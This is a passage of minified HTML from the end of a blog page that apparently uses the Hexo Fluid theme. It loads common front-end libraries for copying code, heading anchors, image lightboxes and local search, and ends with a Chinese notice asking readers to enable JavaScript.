src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script><script>Fluid.plugins.codeWidget()</script><script>Fluid.utils.createScript("https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js",function(){window.anchors.options={placement:CONFIG.anchorjs.placement,visible:CONFIG.anchorjs.visible},CONFIG.anchorjs.icon&&(window.anchors.options.icon=CONFIG.anchorjs.icon);var n,o=[];for(n of(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","))o.push(".markdown-body > "+n.trim());"left"===CONFIG.anchorjs.placement&&(window.anchors.options.class="anchorjs-link-left"),window.anchors.add(o.join(", ")),Fluid.events.registerRefreshCallback(function(){if("anchors"in window){anchors.removeAll();var n,o=[];for(n of(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","))o.push(".markdown-body > "+n.trim());"left"===CONFIG.anchorjs.placement&&(anchors.options.class="anchorjs-link-left"),anchors.add(o.join(", "))}})})</script><script>Fluid.utils.createScript("https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js",function(){Fluid.plugins.fancyBox()})</script><script>Fluid.plugins.imageCaption()</script><script defer=defer src=/js/leancloud.js></script><script src=/js/local-search.js></script><script src=/js/boot.js></script><noscript><div class=noscript-warning>博客在允许 JavaScript 运行的环境下浏览效果更佳</div></noscript></body></html>